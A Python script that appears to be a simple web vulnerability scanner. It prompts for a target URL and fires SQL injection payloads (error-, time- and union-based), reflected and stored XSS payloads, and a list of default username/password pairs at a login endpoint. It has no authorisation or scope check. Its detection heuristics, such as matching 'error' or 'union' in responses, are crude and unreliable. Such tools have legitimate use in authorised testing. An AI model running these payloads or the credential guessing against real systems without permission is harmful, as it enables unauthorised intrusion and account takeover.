import requests
import time

# ANSI escape codes for color output
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

# Function to print the banner
def print_banner():
    banner = """
    __        _______ _                _       
    \\ \\      / / ____| |              | |      
     \\ \\    / / (___ | |_ _ __ ___  __| | ___  
      \\ \\  / / \\___ \\| __| '__/ _ \\/ _` |/ _ \\ 
       \\ \\/ /  ____) | |_| | |  __/ (_| |  __/ 
        \\__/  |_____/ \\__|_|  \\___|\\__,_|\\___| 
                                             
    """
    print(f"{GREEN}{banner}{RESET}")

# Print the banner
print_banner()

# Default list of credentials
DEFAULT_CREDENTIALS = [
    ('admin', 'admin'), ('admin', 'password'), ('admin', '1234'), ('admin', '12345'),
    ('admin', '123456'), ('admin', 'admin123'), ('admin', 'pass'), ('admin', 'admin1'),
    ('admin', 'root'), ('admin', 'toor'), ('admin', 'letmein'), ('root', 'root'),
    ('root', 'password'), ('root', '1234'), ('root', '12345'), ('root', '123456'),
    ('root', 'admin'), ('root', 'admin123'), ('root', 'pass'), ('root', 'toor'),
    ('root', 'letmein'), ('user', 'user'), ('user', 'password'), ('user', '1234'),
    ('user', '12345'), ('user', '123456'), ('user', 'admin'), ('user', 'admin123'),
    ('user', 'pass'), ('user', 'letmein'), ('guest', 'guest'), ('guest', 'password'),
    ('guest', '1234'), ('guest', '12345'), ('guest', '123456'), ('guest', 'admin'),
    ('guest', 'admin123'), ('guest', 'pass'), ('guest', 'letmein'), ('support', 'support'),
    ('support', 'password'), ('support', '1234'), ('support', '12345'), ('support', '123456'),
    ('support', 'admin'), ('support', 'admin123'), ('support', 'pass'), ('support', 'letmein'),
    ('test', 'test'), ('test', 'password'), ('test', '1234'), ('test', '12345'),
    ('test', '123456'), ('test', 'admin'), ('test', 'admin123'), ('test', 'pass'),
    ('test', 'letmein'), ('administrator', 'administrator'), ('administrator', 'password'),
    ('administrator', '1234'), ('administrator', '12345'), ('administrator', '123456'),
    ('administrator', 'admin'), ('administrator', 'admin123'), ('administrator', 'pass'),
    ('administrator', 'letmein')
]

# SQL Injection Tests
def test_sql_injection(base_url, param):
    """
    Tests for various types of SQL Injection vulnerabilities.
    """
    vulnerabilities_found = []

    # Error-based SQLi
    error_based_payloads = [
        "' OR 1=1 --", "' AND 1=2 --", "' UNION SELECT null, null --",
        "' UNION SELECT 1, 'test' --", "' AND SLEEP(5) --", 
        "' OR 'a'='a", "' OR '1'='1", "' OR '1'='1' --", 
        "' AND 'a'='a", "' AND 1=1 --", "' AND 1=2 --"
    ]
    
    # Blind SQLi (time-based)
    time_based_payloads = [
        "' OR IF(1=1, SLEEP(5), 0) --", "' AND IF(2>1, SLEEP(5), 0) --",
        "' OR BENCHMARK(10000000, MD5(1)) --", "' AND IF(1=1, SLEEP(5), NULL) --"
    ]
    
    # Union-based SQLi
    union_based_payloads = [
        "' UNION SELECT null, null --", "' UNION SELECT 1, 2, 3 --",
        "' UNION SELECT 1, 'user', 'pass' --", "' UNION SELECT ALL NULL, NULL --"
    ]

    # Error-based SQLi test
    for payload in error_based_payloads:
        vulnerable_url = f"{base_url}?{param}={payload}"
        try:
            response = requests.get(vulnerable_url, timeout=10)
            if "error" in response.text.lower() or "syntax" in response.text.lower():
                vulnerabilities_found.append(f"{RED}[Error-based SQL Injection] Vulnerability found with payload: {payload}{RESET}")
                break
        except requests.RequestException as e:
            print(f"{RED}Error testing SQL Injection: {e}{RESET}")

    # Blind SQLi (time-based) test
    for payload in time_based_payloads:
        vulnerable_url = f"{base_url}?{param}={payload}"
        try:
            response = requests.get(vulnerable_url, timeout=10)
            if response.elapsed.total_seconds() > 5:
                vulnerabilities_found.append(f"{RED}[Blind SQL Injection] Vulnerability found with payload: {payload}{RESET}")
                break
        except requests.RequestException as e:
            print(f"{RED}Error testing Blind SQL Injection: {e}{RESET}")

    # Union-based SQLi test
    for payload in union_based_payloads:
        vulnerable_url = f"{base_url}?{param}={payload}"
        try:
            response = requests.get(vulnerable_url, timeout=10)
            if "union" in response.text.lower():
                vulnerabilities_found.append(f"{RED}[Union-based SQL Injection] Vulnerability found with payload: {payload}{RESET}")
                break
        except requests.RequestException as e:
            print(f"{RED}Error testing Union-based SQL Injection: {e}{RESET}")

    if not vulnerabilities_found:
        vulnerabilities_found.append(f"{GREEN}[SQL Injection] No vulnerabilities found with parameter {param}{RESET}")
    
    return vulnerabilities_found

# XSS Test (Reflected, Stored, DOM-based)
def test_xss(base_url, param):
    """
    Tests for various types of XSS vulnerabilities.
    """
    xss_results = []
    payloads = [
        "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", 
        "<svg/onload=alert('XSS')>", "'\"><script>alert('XSS')</script>", 
        "';!--\"<XSS>=&{()}",
        "<iframe src=javascript:alert('XSS')>", "<body onload=alert('XSS')>",
        "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+'></object>"
    ]

    # Test Reflected XSS
    def test_reflected_xss(base_url, param):
        for payload in payloads:
            try:
                response = requests.get(base_url, params={param: payload})
                if payload in response.text:
                    xss_results.append(f"{RED}[Reflected XSS] Vulnerability found with parameter {param} using payload: {payload}{RESET}")
                    return True
            except requests.RequestException as e:
                print(f"{RED}Error testing Reflected XSS: {e}{RESET}")
        return False

    # Test Stored XSS
    def test_stored_xss(base_url, param):
        for payload in payloads:
            try:
                response = requests.post(base_url, data={param: payload})
                # Assuming the application reflects stored content in some page
                response_check = requests.get(base_url)
                if payload in response_check.text:
                    xss_results.append(f"{RED}[Stored XSS] Vulnerability found using payload: {payload}{RESET}")
                    return True
            except requests.RequestException as e:
                print(f"{RED}Error testing Stored XSS: {e}{RESET}")
        return False

    # Test DOM-based XSS
    def test_dom_based_xss(base_url, param):
        try:
            response = requests.get(base_url, params={param: "test"})
            if "document" in response.text.lower() or "window.location" in response.text.lower():
                xss_results.append(f"{RED}[DOM-Based XSS] Potential DOM-Based XSS found with parameter {param}{RESET}")
                return True
        except requests.RequestException as e:
            print(f"{RED}Error testing DOM-Based XSS: {e}{RESET}")
        return False

    # Run the XSS tests
    if not test_reflected_xss(base_url, param):
        xss_results.append(f"{GREEN}[Reflected XSS] No vulnerabilities found with parameter {param}{RESET}")
    if not test_stored_xss(base_url, param):
        xss_results.append(f"{GREEN}[Stored XSS] No vulnerabilities found with parameter {param}{RESET}")
    if not test_dom_based_xss(base_url, param):
        xss_results.append(f"{GREEN}[DOM-Based XSS] No vulnerabilities found with parameter {param}{RESET}")
    
    return xss_results

# Authentication Test
def test_authentication(auth_url, credentials):
    """
    Tests for weak or default credentials at a specific authentication URL.
    """
    auth_results = []
    vulnerable = False

    for username, password in credentials:
        try:
            response = requests.post(auth_url, data={'username': username, 'password': password})
            if response.status_code == 200 and "welcome" in response.text.lower():
                auth_results.append(f"{RED}[Authentication] Weak credentials found: {username}:{password}{RESET}")
                vulnerable = True
                break
        except requests.RequestException as e:
            print(f"{RED}Error testing authentication: {e}{RESET}")
    
    if not vulnerable:
        auth_results.append(f"{GREEN}[Authentication] No weak credentials found at {auth_url}{RESET}")

    return auth_results

# Main function to run all tests
def main():
    # User inputs
    base_url = input("Enter the base URL for testing (without parameters): ")
    sql_param = input("Enter the parameter name to test for SQL Injection: ")
    xss_param = input("Enter the parameter name to test for XSS: ")
    auth_url = input("Enter the URL to test for authentication vulnerabilities: ")

    # Run the vulnerability tests
    print(f"\nStarting vulnerability tests on {base_url}...\n")
    
    # SQL Injection Test
    sql_results = test_sql_injection(base_url, sql_param)
    for result in sql_results:
        print(result)
    
    # XSS Test
    xss_results = test_xss(base_url, xss_param)
    for result in xss_results:
        print(result)

    # Authentication Test
    auth_results = test_authentication(auth_url, DEFAULT_CREDENTIALS)
    for result in auth_results:
        print(result)

if __name__ == "__main__":
    main()
